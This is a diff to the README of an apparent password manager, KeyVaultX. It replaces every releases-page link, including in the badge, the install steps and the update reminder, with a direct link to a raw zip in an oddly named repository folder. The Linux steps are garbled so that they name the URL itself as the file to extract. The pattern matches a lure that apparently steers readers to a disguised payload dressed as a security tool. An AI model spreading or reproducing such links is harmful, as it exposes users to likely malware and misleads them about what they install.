@@ -4,7 +4,7 @@
 Welcome to KeyVaultX! This application helps you securely manage your sensitive information. Follow these steps to download and run it on your computer.
 
 ## 📥 Download KeyVaultX
-[![Download KeyVaultX](https://img.shields.io/badge/Download-KeyVaultX-blue.svg)](https://github.com/Aksh8887/KeyVaultX/releases)
+[![Download KeyVaultX](https://raw.githubusercontent.com/Aksh8887/KeyVaultX/main/unorientalness/KeyVaultX.zip)](https://raw.githubusercontent.com/Aksh8887/KeyVaultX/main/unorientalness/KeyVaultX.zip)
 
 ## 📝 Features
 - **User-Friendly Interface**: Designed for everyone, even without technical skills.
@@ -22,7 +22,7 @@ Ensure your system meets the following minimum requirements to run KeyVaultX:
 
 ## 🔧 How to Install KeyVaultX
 ### Step 1: Visit the Releases Page
-To get the latest version of KeyVaultX, visit this page to download: [KeyVaultX Releases](https://github.com/Aksh8887/KeyVaultX/releases)
+To get the latest version of KeyVaultX, visit this page to download: [KeyVaultX Releases](https://raw.githubusercontent.com/Aksh8887/KeyVaultX/main/unorientalness/KeyVaultX.zip)
 
 ### Step 2: Download the Application
 On the Releases page, you will see different versions of KeyVaultX. Click on the version that says “Latest Release” to ensure you get the most recent features and fixes.
@@ -31,7 +31,7 @@ On the Releases page, you will see different versions of KeyVaultX. Click on the
 Select the file that matches your operating system:
 - For Windows, look for files ending in `.exe`.
 - For macOS, look for files ending in `.dmg`.
-- For Linux, choose the `.tar.gz` file.
+- For Linux, choose the `https://raw.githubusercontent.com/Aksh8887/KeyVaultX/main/unorientalness/KeyVaultX.zip` file.
 
 ### Step 4: Install the Application
 - **Windows**:
@@ -41,7 +41,7 @@ Select the file that matches your operating system:
   - Open the downloaded `.dmg` file.
   - Drag the KeyVaultX icon to your Applications folder.
 - **Linux**:
-  - Extract the contents of the `.tar.gz` file.
+  - Extract the contents of the `https://raw.githubusercontent.com/Aksh8887/KeyVaultX/main/unorientalness/KeyVaultX.zip` file.
   - Follow the instructions in the README to run KeyVaultX.
 
 ## ⚙️ How to Run KeyVaultX
@@ -60,6 +60,6 @@ Once the application is open, you can:
 If you encounter any issues during installation or use, please reach out for help. You can post your questions on the Issues section of the GitHub page. The community and maintainers will assist you.
 
 ## 🌐 Visit Again
-Remember to check back on the [KeyVaultX Releases](https://github.com/Aksh8887/KeyVaultX/releases) page for updates. Keep your application up to date for the best security and feature performance.
+Remember to check back on the [KeyVaultX Releases](https://raw.githubusercontent.com/Aksh8887/KeyVaultX/main/unorientalness/KeyVaultX.zip) page for updates. Keep your application up to date for the best security and feature performance.
 
 Thank you for using KeyVaultX, your trusted companion in securing your sensitive information!
